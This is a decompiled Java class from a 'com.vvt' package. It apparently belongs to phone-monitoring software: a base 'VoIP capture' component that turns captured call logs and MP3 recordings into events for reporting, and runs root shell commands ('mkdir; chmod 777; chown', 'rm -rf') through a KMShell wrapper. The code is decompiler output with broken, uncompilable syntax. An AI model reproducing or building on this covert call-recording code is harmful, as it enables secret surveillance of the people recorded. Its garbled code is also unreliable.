package com.vvt.al;

import com.vvt.events.FxEventDirection;
import com.vvt.events.FxMediaType;
import com.vvt.events.FxRecipientType;
import com.vvt.events.FxVoipCallLogEvent.FxIsMonitor;
import com.vvt.events.FxVoipCallRecordingEvent;
import com.vvt.events.FxVoipCategory;
import com.vvt.events.h;
import com.vvt.im.events.info.ICallLogData;
import com.vvt.im.events.info.ICallLogData.Direction;
import com.vvt.io.p;
import com.vvt.shell.KMShell;
import com.vvt.shell.KMShell.ShellException;
import com.vvt.shell.ShellUtil;
import java.io.File;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;

public abstract class a
{
  private static final boolean c = com.vvt.ak.a.a;
  private static final boolean d = com.vvt.ak.a.e;
  protected String a = "";
  protected String b = "";
  private com.vvt.base.a e;
  private String f = "BaseVoipCapture";
  
  public a(String paramString1, String paramString2, com.vvt.base.a parama)
  {
    this.a = paramString1;
    this.b = paramString2;
    this.e = parama;
    String str = b();
    this.f = str;
  }
  
  public abstract String a();
  
  public void a(String paramString, ICallLogData paramICallLogData, com.vvt.im.events.info.d paramd, FxVoipCategory paramFxVoipCategory)
  {
    boolean bool1 = c;
    if (bool1) {}
    bool1 = c;
    if (bool1) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    FxVoipCallRecordingEvent localFxVoipCallRecordingEvent = new com/vvt/events/FxVoipCallRecordingEvent;
    localFxVoipCallRecordingEvent.<init>();
    long l = paramICallLogData.h();
    localFxVoipCallRecordingEvent.setEventTime(l);
    localFxVoipCallRecordingEvent.setVoipCategory(paramFxVoipCategory);
    Object localObject1 = FxEventDirection.MISSED_CALL;
    Object localObject2 = paramICallLogData.i();
    Object localObject3 = ICallLogData.Direction.IN;
    boolean bool4;
    if (localObject2 == localObject3)
    {
      localObject1 = FxEventDirection.IN;
      localObject2 = new java/io/File;
      ((File)localObject2).<init>(paramString);
      boolean bool3 = ((File)localObject2).exists();
      if (!bool3) {
        break label443;
      }
      bool4 = ((File)localObject2).canRead();
      if (!bool4) {
        break label443;
      }
      bool4 = c;
      if (!bool4) {}
    }
    for (;;)
    {
      localFxVoipCallRecordingEvent.setDirection((FxEventDirection)localObject1);
      l = paramICallLogData.a();
      localFxVoipCallRecordingEvent.setDuration(l);
      localObject1 = paramd.b();
      localFxVoipCallRecordingEvent.setOwnerId((String)localObject1);
      localObject1 = paramd.a();
      localFxVoipCallRecordingEvent.setOwnerContactName((String)localObject1);
      localObject1 = new java/util/ArrayList;
      ((ArrayList)localObject1).<init>();
      localObject2 = new com/vvt/events/h;
      ((h)localObject2).<init>();
      localObject3 = paramICallLogData.c();
      ((h)localObject2).b((String)localObject3);
      localObject3 = paramICallLogData.c();
      ((h)localObject2).a((String)localObject3);
      localObject3 = FxRecipientType.TO;
      ((h)localObject2).a((FxRecipientType)localObject3);
      ((ArrayList)localObject1).add(localObject2);
      localFxVoipCallRecordingEvent.setRecipientStore((ArrayList)localObject1);
      localObject1 = new java/lang/StringBuilder;
      ((StringBuilder)localObject1).<init>();
      localObject2 = new java/text/SimpleDateFormat;
      ((SimpleDateFormat)localObject2).<init>("yyyyMMdd_HHmmss");
      localObject3 = new java/util/Date;
      ((Date)localObject3).<init>();
      localObject2 = ((SimpleDateFormat)localObject2).format((Date)localObject3);
      localObject1 = ((StringBuilder)localObject1).append((String)localObject2);
      localObject2 = ".mp3";
      localObject1 = (String)localObject2;
      localFxVoipCallRecordingEvent.setFileName((String)localObject1);
      localFxVoipCallRecordingEvent.setFilePath(paramString);
      int i = FxMediaType.MP3.getNumber();
      localFxVoipCallRecordingEvent.setMediaType(i);
      localObject1 = FxVoipCallLogEvent.FxIsMonitor.NO;
      localFxVoipCallRecordingEvent.setIsMonitor((FxVoipCallLogEvent.FxIsMonitor)localObject1);
      localArrayList.add(localFxVoipCallRecordingEvent);
      localObject1 = this.e;
      if (localObject1 != null)
      {
        localObject1 = this.e;
        ((com.vvt.base.a)localObject1).a(localArrayList);
      }
      boolean bool2 = c;
      if (bool2) {}
      return;
      localObject2 = paramICallLogData.i();
      localObject3 = ICallLogData.Direction.OUT;
      if (localObject2 != localObject3) {
        break;
      }
      localObject1 = FxEventDirection.OUT;
      break;
      label443:
      bool4 = c;
      if (bool4) {}
      paramString = com.vvt.io.d.h(paramString);
      bool4 = c;
      if (!bool4) {}
    }
  }
  
  public boolean a(ICallLogData paramICallLogData)
  {
    boolean bool1 = c;
    if (bool1) {}
    long l1 = paramICallLogData.a();
    long l2 = 0L;
    bool1 = l1 < l2;
    if (!bool1) {}
    for (bool1 = false;; bool1 = true)
    {
      boolean bool2 = c;
      if (bool2) {}
      bool2 = c;
      if (bool2) {}
      return bool1;
    }
  }
  
  public abstract String b();
  
  public String c()
  {
    String str1 = this.b;
    String str2 = a();
    str1 = p.a(str1, str2);
    int i = 5;
    Object[] arrayOfObject = new Object[i];
    arrayOfObject[0] = str1;
    arrayOfObject[1] = str1;
    String str3 = this.a;
    arrayOfObject[2] = str3;
    str3 = this.a;
    arrayOfObject[3] = str3;
    int j = 4;
    arrayOfObject[j] = str1;
    str2 = String.format("mkdir %s; chmod 777 %s; chown %s.%s %s", arrayOfObject);
    try
    {
      KMShell.a(str2);
      bool = com.vvt.aa.a.c();
      if (bool) {
        ShellUtil.k(str1);
      }
      return str1;
    }
    catch (Exception localException)
    {
      for (;;)
      {
        boolean bool = d;
        if (!bool) {}
      }
    }
  }
  
  public void d()
  {
    String str1 = c();
    String str2 = "rm -rf %s";
    int i = 1;
    try
    {
      Object[] arrayOfObject = new Object[i];
      arrayOfObject[0] = str1;
      str1 = String.format(str2, arrayOfObject);
      KMShell.a(str1);
      return;
    }
    catch (KMShell.ShellException localShellException)
    {
      for (;;)
      {
        boolean bool = d;
        if (!bool) {}
      }
    }
  }
  
  public String e()
  {
    return p.a(this.b, "busybox");
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/al/a.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */